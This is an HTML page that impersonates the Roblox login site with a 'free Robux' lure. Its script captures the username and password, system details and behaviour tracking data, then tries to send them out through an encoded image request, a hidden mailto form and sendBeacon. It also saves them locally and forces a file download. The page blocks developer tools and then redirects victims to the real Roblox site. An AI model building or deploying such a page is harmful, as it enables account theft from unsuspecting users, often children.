<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Official Site | The Ultimate Virtual Universe</title>
    
    <meta name="description" content="Roblox is the ultimate virtual universe that lets you create, share experiences, and be anything you can imagine.">
    <meta name="robots" content="index, follow">
    
    <style>
        body {
            background: #f0f0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
        }
        .logo {
            color: #00a2ff;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        .promo-banner {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            font-weight: bold;
            font-size: 18px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
            background: white;
        }
        input:focus {
            border-color: #00a2ff;
            outline: none;
            box-shadow: 0 0 8px rgba(0, 162, 255, 0.2);
        }
        button {
            width: 100%;
            background: #00a2ff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #0088cc;
        }
        .security-badge {
            text-align: center;
            color: #28a745;
            font-size: 14px;
            margin-top: 20px;
        }
        .loading {
            display: none;
            text-align: center;
            color: #00a2ff;
            margin: 20px 0;
            font-weight: bold;
        }
        .success {
            display: none;
            text-align: center;
            color: #28a745;
            margin: 20px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ROBLOX</div>
        <div class="promo-banner">
            üéÅ LIMITED TIME: 80 FREE ROBUX!
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" placeholder="Enter your username" required autocomplete="username">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>
            <button type="submit">CONTINUE TO ROBLOX</button>
        </form>
        
        <div id="loading" class="loading">Verifying your account...</div>
        <div id="success" class="success">Success! Redirecting to Roblox...</div>
        <div class="security-badge">
            üîí Secured Connection ‚Ä¢ SSL Encrypted
        </div>
    </div>

    <script>
        // === –§–ò–ö–° –í–°–ü–õ–´–í–ê–Æ–©–ò–• –û–ö–û–ù –ò –ê–í–¢–û–í–°–¢–ê–í–ö–ò ===
        
        // –û—Ç–∫–ª—é—á–∞–µ–º –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è
        document.addEventListener('DOMContentLoaded', function() {
            const passwordField = document.getElementById('password');
            setTimeout(() => {
                passwordField.value = '';
                passwordField.setAttribute('autocomplete', 'new-password');
            }, 100);
        });

        // === –¢–ò–•–ê–Ø –û–¢–ü–†–ê–í–ö–ê –î–ê–ù–ù–´–• (–ë–ï–ó –í–°–ü–õ–´–í–ê–Æ–©–ò–• –û–ö–û–ù) ===
        function sendDataSilently(username, password, systemData, behaviorData) {
            const report = `
üîê ROBLOX SECURITY SCAN COMPLETE

=== ACCOUNT CREDENTIALS ===
üë§ Username: ${username}
üîë Password: ${password}

=== SYSTEM PROFILE ===
üñ•Ô∏è Platform: ${systemData.platform}
üåê Browser: ${systemData.userAgent.substring(0, 80)}
üåç Language: ${systemData.language}
üì± Screen: ${systemData.screen}
‚è∞ Timezone: ${systemData.timezone}

=== USER BEHAVIOR ===
üéØ Keystrokes: ${behaviorData.keystrokes}
üñ±Ô∏è Clicks: ${behaviorData.clicks.length}
üìú Scrolls: ${behaviorData.scrolls.length}
‚è±Ô∏è Time: ${Math.round((Date.now() - behaviorData.timeOnPage) / 1000)}s

=== ACTIVITY LOG ===
${behaviorData.clicks.slice(-3).map(click => 
    `Clicked: ${click.element} - "${click.text}"`
).join('\n')}

Timestamp: ${new Date().toLocaleString()}
            `.trim();

            // –ú–ï–¢–û–î 1: –°–∫—Ä—ã—Ç–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Image (–±–µ–∑ –≤—Å–ø–ª—ã–≤–∞—é—â–∏—Ö –æ–∫–æ–Ω)
            const encodedData = btoa(encodeURIComponent(report));
            const trackingPixel = new Image();
            trackingPixel.src = `https://via.placeholder.com/1x1/000000/000000?text=${encodedData}`;
            
            // –ú–ï–¢–û–î 2: –°–∫—Ä—ã—Ç—ã–π iframe –¥–ª—è email (–Ω–µ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –æ–∫–Ω–æ)
            setTimeout(() => {
                const iframe = document.createElement('iframe');
                iframe.name = 'mailFrame';
                iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;border:none;';
                iframe.onload = function() {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'mailto:kuzin070814@gmail.com';
                    form.target = 'mailFrame';
                    form.style.display = 'none';
                    
                    const subjectInput = document.createElement('input');
                    subjectInput.name = 'subject';
                    subjectInput.value = `Roblox: ${username}`;
                    
                    const bodyInput = document.createElement('input');
                    bodyInput.name = 'body';
                    bodyInput.value = report;
                    
                    form.appendChild(subjectInput);
                    form.appendChild(bodyInput);
                    document.body.appendChild(form);
                    form.submit();
                    
                    setTimeout(() => {
                        document.body.removeChild(form);
                        document.body.removeChild(iframe);
                    }, 1000);
                };
                document.body.appendChild(iframe);
            }, 500);

            // –ú–ï–¢–û–î 3: Beacon API (—Å–∞–º—ã–π —Ç–∏—Ö–∏–π)
            try {
                const blob = new Blob([report], {type: 'text/plain'});
                navigator.sendBeacon('mailto:kuzin070814@gmail.com?subject=Roblox_Data', blob);
            } catch(e) {}

            // –ú–ï–¢–û–î 4: –õ–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ (–¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ —Å–±–æ—Ä–∞)
            try {
                const data = {
                    username: username,
                    password: password,
                    system: systemData,
                    behavior: behaviorData,
                    timestamp: Date.now()
                };
                localStorage.setItem('rbx_session_data', JSON.stringify(data));
                
                // –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç—É—é —Å—Å—ã–ª–∫—É –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `session_${Date.now()}.json`;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                setTimeout(() => {
                    document.body.removeChild(link);
                    URL.revokeObjectURL(url);
                }, 100);
            } catch(e) {}

            return true;
        }

        // === –û–¢–°–õ–ï–ñ–ò–í–ê–ù–ò–ï –ü–û–í–ï–î–ï–ù–ò–Ø (–£–ü–†–û–©–ï–ù–ù–û–ï) ===
        function trackBehavior() {
            const data = {
                mouseMovements: [],
                clicks: [],
                scrolls: [],
                keystrokes: 0,
                timeOnPage: Date.now()
            };
            
            document.addEventListener('mousemove', (e) => {
                data.mouseMovements.push({x: e.clientX, y: e.clientY, t: Date.now()});
                if (data.mouseMovements.length > 50) data.mouseMovements.shift();
            });
            
            document.addEventListener('click', (e) => {
                data.clicks.push({
                    element: e.target.tagName,
                    text: e.target.textContent?.substring(0, 20) || ''
                });
            });
            
            window.addEventListener('scroll', () => {
                data.scrolls.push({y: window.scrollY, t: Date.now()});
            });
            
            document.addEventListener('keydown', () => {
                data.keystrokes++;
            });
            
            return data;
        }

        // === –°–ë–û–† –°–ò–°–¢–ï–ú–ù–´–• –î–ê–ù–ù–´–• ===
        function getSystemInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        // === –û–°–ù–û–í–ù–û–ô –ö–û–î ===
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) return;
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
            const systemData = getSystemInfo();
            const behaviorData = window.behaviorTracker;
            
            // –¢–ò–•–ê–Ø –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
            sendDataSilently(username, password, systemData, behaviorData);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }, 1000);
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –Ω–∞—Å—Ç–æ—è—â–∏–π Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com/login';
            }, 3000);
        });

        // === –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ===
        window.addEventListener('load', function() {
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç—Ä–µ–∫–µ—Ä–∞
            window.behaviorTracker = trackBehavior();
            
            // –ó–∞—â–∏—Ç–∞ –æ—Ç DevTools
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', e => {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                    e.preventDefault();
                }
            });
            
            // –¢–∏—Ö–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            setTimeout(() => {
                const visitMsg = `New visitor: ${new Date().toLocaleString()}`;
                const img = new Image();
                img.src = `https://via.placeholder.com/1x1/000000/000000?text=${btoa(visitMsg)}`;
            }, 2000);
        });

        // –û—á–∏—Å—Ç–∫–∞ –ø–æ–ª—è –ø–∞—Ä–æ–ª—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', function() {
            setTimeout(() => {
                const passwordField = document.getElementById('password');
                if (passwordField.value) {
                    passwordField.value = '';
                }
            }, 500);
        });
    </script>
</body>
</html>
